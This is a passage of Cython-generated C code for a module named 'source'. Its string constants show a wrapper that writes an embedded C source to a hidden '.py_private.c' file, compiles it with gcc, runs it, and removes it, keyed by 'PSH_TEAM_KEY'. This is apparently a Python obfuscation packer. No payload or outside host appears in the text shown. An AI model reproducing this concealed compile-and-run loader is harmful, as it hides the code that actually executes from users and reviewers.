#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_open;
static const char __pyx_k_[] = "\330\250\330\256 \360\237\221\200";
static const char __pyx_k_L[] = " -L";
static const char __pyx_k_f[] = "f";
static const char __pyx_k_o[] = " -o ";
static const char __pyx_k_w[] = "w";
static const char __pyx_k__2[] = "./";
static const char __pyx_k__3[] = " && ";
static const char __pyx_k__5[] = ".";
static const char __pyx_k__6[] = " ";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_RUN[] = "RUN";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_path[] = "path";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_gcc_I[] = "gcc -I";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_C_FILE[] = "C_FILE";
static const char __pyx_k_PREFIX[] = "PREFIX";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_isfile[] = "isfile";
static const char __pyx_k_prefix[] = "prefix";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_dirname[] = "dirname";
static const char __pyx_k_version[] = "version";
static const char __pyx_k_C_SOURCE[] = "C_SOURCE";
static const char __pyx_k_exist_ok[] = "exist_ok";
static const char __pyx_k_makedirs[] = "makedirs";
static const char __pyx_k_executable[] = "executable";
static const char __pyx_k_lib_lpython[] = "/lib -lpython";
static const char __pyx_k_COMPILE_FILE[] = "COMPILE_FILE";
static const char __pyx_k_EXECUTE_FILE[] = "EXECUTE_FILE";
static const char __pyx_k_PSH_TEAM_KEY[] = "PSH_TEAM_KEY";
static const char __pyx_k_py_private_c[] = ".py_private.c";
static const char __pyx_k_PYTHON_VERSION[] = "PYTHON_VERSION";
static const char __pyx_k_include_python[] = "/include/python";
static const char __pyx_k_EXPORT_PYTHONHOME[] = "EXPORT_PYTHONHOME";
static const char __pyx_k_export_PYTHONHOME[] = "export PYTHONHOME=";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_EXPORT_PYTHON_EXECUTABLE[] = "EXPORT_PYTHON_EXECUTABLE";
static const char __pyx_k_export_PYTHON_EXECUTABLE[] = "export PYTHON_EXECUTABLE=";
static const char __pyx_k_PY_PRIVATE_20240909130916210[] = ".PY_PRIVATE/20240909130916210";
static const char __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define[] = "#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif /* PY_SSIZE_T_CLEAN */\n#include \"Python.h\"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\n    #error Cython requires Python 2.6+ or Python 3.3+.\n#else\n#define CYTHON_ABI \"0_29_33\"\n#define CYTHON_HEX_VERSION 0x001D21F0\n#define CYTHON_FUTURE_DIVISION 1\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #if PY_VERSION_HEX >= 0x02070000\n    #define HAVE_LONG_LONG\n  #endif\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#ifdef PYPY_VERSION\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE""_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PYSTON_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_ASYNC_SLOTS\n  #define CYTHON_USE_ASYNC_SLOTS 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON""_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PY_NOGIL)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 1\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #ifndef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #e""ndif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #if PY_MAJOR_VERSION < 3\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 0\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #if PY_VERSION_HEX >= 0x030B00A4\n    #undef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 0\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\n  #endif\n  #ifndef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\n  #endif\n  #if PY_VERSION_HEX >= 0x030B0""0A4\n    #undef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 0\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n#endif\n#if !defined(CYTHON_FAST_PYCCALL)\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\n#endif\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_MAJOR_VERSION < 3\n    #include \"longintrepr.h\"\n  #endif\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#define __Pyx_void""_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n           typedef unsigned char     uint8_t;\n           typedef unsigned int      uint32_t;\n        #else\n           typedef unsigned __int8   uint8_t;\n           typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n#else\n   #include <stdint.h>\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus) && __cplusplus >= 201103L\n    #if __has_cpp_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\n    #elif __has_cpp_attribute(clang::fallthrough)\n      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n    #elif __has_cpp_attribute(gnu::fallthrough)\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__ ) && defined(__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  #elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\n  #define Py_OptimizeFlag 0\n#endif\n#define __PYX_BUILD_PY_SSIZE_T \"n\"\n#define CYTHON_FORMAT_SSIZE_T \"z\"\n#if PY_MAJOR_VERSION < 3\n  #define __Pyx_BUILTIN_MODULE_NAME \"__builtin__\"\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, ln""os)\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n  #define __Pyx_DefaultClassType PyClass_Type\n#else\n  #define __Pyx_BUILTIN_MODULE_NAME \"builtins\"\n  #define __Pyx_DefaultClassType PyType_Type\n#if PY_VERSION_HEX >= 0x030B00A1\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\n                                                    PyObject *name, int fline, PyObject *lnos) {\n        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;\n        const char *fn_cstr=NULL;\n        const char *name_cstr=NULL;\n        PyCodeObject* co=NULL;\n        PyObject *type, *value, *traceback;\n        PyErr_Fetch(&type, &value, &traceback);\n        if (!(kwds=PyDict_New())) goto end;\n        if (!(argcount=PyLong_FromLong(a))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_argcount\", argcount) != 0) goto end;\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_posonlyargcount\", posonlyargcount) != 0) goto end;\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_kwonlyargcount\", kwonlyargcount) != 0) goto end;\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_nlocals\", nlocals) != 0) goto end;\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_stacksize\", stacksize) != 0) goto end;\n        if (!(flags=PyLong_FromLong(f))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_flags\", flags) != 0) goto end;\n        if (PyDict_SetItemSt""ring(kwds, \"co_code\", code) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_consts\", c) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_names\", n) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_varnames\", v) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_freevars\", fv) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_cellvars\", cell) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_linetable\", lnos) != 0) goto end;\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\n        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;\n        if (!(replace = PyObject_GetAttrString((PyObject*)co, \"replace\"))) goto cleanup_code_too;\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\n        Py_XDECREF((PyObject*)co);\n        co = (PyCodeObject*)call_result;\n        call_result = NULL;\n        if (0) {\n            cleanup_code_too:\n            Py_XDECREF((PyObject*)co);\n            co = NULL;\n        }\n        end:\n        Py_XDECREF(kwds);\n        Py_XDECREF(argcount);\n        Py_XDECREF(posonlyargcount);\n        Py_XDECREF(kwonlyargcount);\n        Py_XDECREF(nlocals);\n        Py_XDECREF(stacksize);\n        Py_XDECREF(replace);\n        Py_XDECREF(call_result);\n        Py_XDECREF(empty);\n        if (type) {\n            PyErr_Restore(type, value, traceback);\n        }\n        return co;\n    }\n#else\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#endif\n  #define __Pyx_DefaultClassType PyType_Type\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#if""ndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n#endif\n#if CYTHON_FAST_PYCCALL\n#define __Pyx_PyFastCFunction_Check(func)\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))\n#else\n#define __Pyx_PyFastCFunction_Check(func) 0\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\n  #define PyMem_RawFree(p)             PyMem_Free(p)\n#endif\n#if CYTHON_COMPILING_IN_PYSTON\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if !CYTHON_FAST_THREAD_STATE || PY_VER""SION_HEX < 0x02070000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x03060000\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#elif PY_VERSION_HEX >= 0x03000000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\n#endif\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\n#include \"pythread.h\"\n#define Py_tss_NEEDS_INIT 0\ntypedef int Py_tss_t;\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\n  *key = PyThread_create_key();\n  return 0;\n}\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\n  *key = Py_tss_NEEDS_INIT;\n  return key;\n}\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\n  PyObject_Free(key);\n}\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\n  return *key != Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {\n  PyThread_delete_key(*key);\n  *key = Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\n  return PyThread_set_key_value(*key, value);\n}\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\n  return PyThread_get_key_value(*key);\n}\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 